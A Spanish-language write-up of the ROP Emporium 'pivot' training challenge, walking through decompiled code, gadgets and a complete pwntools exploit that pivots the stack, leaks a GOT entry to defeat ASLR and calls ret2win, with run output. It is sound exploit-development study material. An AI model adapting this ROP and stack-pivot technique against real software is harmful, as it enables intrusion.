# Pivot (x86\_64)

En este ejercicio nos vuelven a dar un binario y una libc.

```c
pwndbg> checksec
File:     /home/ub1cu0/Desktop/ropEmporium/pivot/pivot
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
RUNPATH:    b'.'
Stripped:   No
```

El binario nos permite introducir 2 valores:

```c
./pivot 
pivot by ROP Emporium
x86_64

Call ret2win() from libpivot
The Old Gods kindly bestow upon you a place to pivot: 0x7f89e0608f10
Send a ROP chain now and it will land there
> hola
Thank you!

Now please send your stack smash
> adios
Thank you!

Exiting
```

Vamos a ver como se ve eso desde `ghidra`:

```c
void pwnme(void *puntero) {
    char array[32];

    memset(array, 0, 0x20);
    puts("Call ret2win() from libpivot");
    printf("The Old Gods kindly bestow upon you a place to pivot: %p\n", puntero);
    puts("Send a ROP chain now and it will land there");
    printf("> ");
    read(0, puntero, 0x100);
    puts("Thank you!\n");
    puts("Now please send your stack smash");
    printf("> ");
    read(0, array, 0x40);
    puts("Thank you!");
    return;
}
```

Como podemos ver, tenemos un buffer overflow con 32 bytes se sobra en el segundo valor que nos piden. También podemos ver que el primer valor que guarda un valor en `puntero`. Vamos a mirar de donde viene ese puntero:

```c
void pwnme(void *puntero);

int main(void) {
    void *ptr;

    setvbuf(stdout, NULL, _IONBF, 0);  // Sin buffer en stdout
    puts("pivot by ROP Emporium");
    puts("x86_64\n");

    ptr = malloc(0x10000000);
    if (ptr == NULL) {
        puts("Failed to request space for pivot stack");
        exit(1);
    }

    // Llamar a pwnme con un puntero adelantado (offset 0xffff00)
    pwnme((char *)ptr + 0xffff00);

    free(ptr);
    puts("\nExiting");

    return 0;
}
```

El programa reserva una gran cantidad de espacio y el puntero es el inicio de ese espacio mas un valor grande, con lo cual es un puntero a una zona muy superior del espacio reservado.

Ahora que sabemos esto podemos hacer un stack pivoting, si conseguimos hacer que el rsp apunte al puntero tendremos la capacidad de hacer una rop chain muy larga.

Para hacer esto vamos a mirar si hay algún gadget interesante que nos permita manipular el rsp:

```c
0x004009bb : pop rax ; ret
. . .
0x004009bd : xchg rsp, rax ; ret
```

Con la fusión de estos 2 gadgets podemos controlar el rsp a voluntad. El programa como hemos viste en el código de la función `pwnme` imprime por pantalla el valor del puntero así teniendo esto tenemos los datos necesarios para hacer stack pivoting:

```python
io.recvlines(4)
pivot_addr = int(io.recvline().decode().strip().split(': ')[1], 16)

stack_pivoting = flat({
    offset: [
        pop_rax, pivot_addr,
        xchg_rsp_rax
    ]
})
```

Con ese payload haríamos que lo que pongamos en el primer input se ejecute una vez se haga el buffer overflow. Con lo cual pasamos de tener 32 bytes para hacer la rop chain a mucho mas.

Ahora que tenemos mas espacio podemos intentar sacar la flag. Si miramos la libc podemos ver que hay una función win que imprime la flag:

```c
void ret2win(void) {
    FILE *stream = fopen("flag.txt", "r");
    if (!stream) {
        puts("Failed to open file: flag.txt");
        exit(1);
    }

    char buf[0x21];
    fgets(buf, sizeof(buf), stream);
    puts(buf);

    fclose(stream);
    exit(0);
}
```

Para poder saber la dirección podemos intentar hacer un leak de puts con puts pero la libc que tiene la función `ret2win` no tiene puts sin embargo el binario si. Si miramos mas funciónes de la libc podemos ver la siguiente:

```c
void foothold_function(void) {
    puts("foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot");
}
```

Lo que pasa es que esa función no se ha llamado nunca con lo cual no está resuelta aun en el `got` para poder sacar su dirección. Lo que tenemos que hacer es llamar nosotros a esa función con nuestra rop chain para hacer que se escriba la dirección en el `got`. Para eso necesitamos que la función `foothold_function` esté en la `plt` de nuestro binario, vamos a comprobarlo:

```c
00000000004009a8 <uselessFunction>:
  4009a8:	55                   	push   rbp
  4009a9:	48 89 e5             	mov    rbp,rsp
  4009ac:	e8 6f fd ff ff       	call   400720 <foothold_function@plt>
  4009b1:	bf 01 00 00 00       	mov    edi,0x1
  4009b6:	e8 95 fd ff ff       	call   400750 <exit@plt>
```

Está! Entonces podemos hacer un leak de esa función con puts y hacer el calculo para saber la dirección de la libc y así conseguir tener la dirección de la función de la libc `ret2win`, vamos con el exploit:

```python
#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("./pivot")
libc = ELF("./libpivot.so")

context.binary = exe
context.terminal = ['kitty']
gdb_script = '''
b ret2win
continue
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
        return r
    return remote("addr", 1337)

def main():
    io = conn()

    offset = 40
    pop_rdi = 0x00400a33 # pop rdi ; ret
    pop_rax = 0x004009bb # pop rax ; ret
    xchg_rsp_rax = 0x004009bd # xchg rsp, rax ; ret
    ret = 0x004006b6 # ret
    
    io.recvlines(4)
    pivot_addr = int(io.recvline().decode().strip().split(': ')[1], 16)
    
    log.success(f'Pivot Address: {hex(pivot_addr)}')
    
    payload1 = flat(
        exe.plt['foothold_function'],
        pop_rdi, exe.got['foothold_function'],
        exe.plt['puts'],
        exe.sym['pwnme'],
        exe.sym['main'], # Instrucción necesaria para que no reviente el exploit
    )
    
    payload2 = flat({
        offset: [
            pop_rax, pivot_addr,
            xchg_rsp_rax
        ]
    })
    
    io.sendlineafter(b'> ', payload1)
    io.sendlineafter(b'> ', payload2)
    
    io.recvlines(2)
    leak = u64(io.recvline().rstrip(b'\n').ljust(8, b'\x00')) # Guardamos el Leak
    log.success(f'Leak: {hex(leak)}')
    
    libc.address = leak - libc.sym['foothold_function'] # Calculamos la dirección base de la libc
    log.success(f'Libc Address: {hex(libc.address)}')
    
    info(f'Ret2win: {hex(libc.symbols['ret2win'])}')
    
    io.sendlineafter(b'> ', b'B' * 8) # La he liado al contar lineas o algo y me hace falta repetir esta linea
    io.sendlineafter(b'> ', b'B' * 8)
    io.sendlineafter(b'> ', b'B' * offset + p64(libc.symbols['ret2win']))
    
    io.interactive()

if __name__ == "__main__":
    main()

```

```c
[+] Starting local process '/home/ub1cu0/Desktop/ropEmporium/pivot/pivot': pid 218429
[+] Pivot Address: 0x7f916cc08f10
[+] Leak: 0x7f916ce0096a
[+] Libc Address: 0x7f916ce00000
[*] Ret2win: 0x7f916ce00a81
[*] Switching to interactive mode
Thank you!

Now please send your stack smash
> [*] Process '/home/ub1cu0/Desktop/ropEmporium/pivot/pivot' stopped with exit code 0 (pid 218429)
Thank you!
ROPE{a_placeholder_32byte_flag!}
```

Funciona! Gracias por leer.
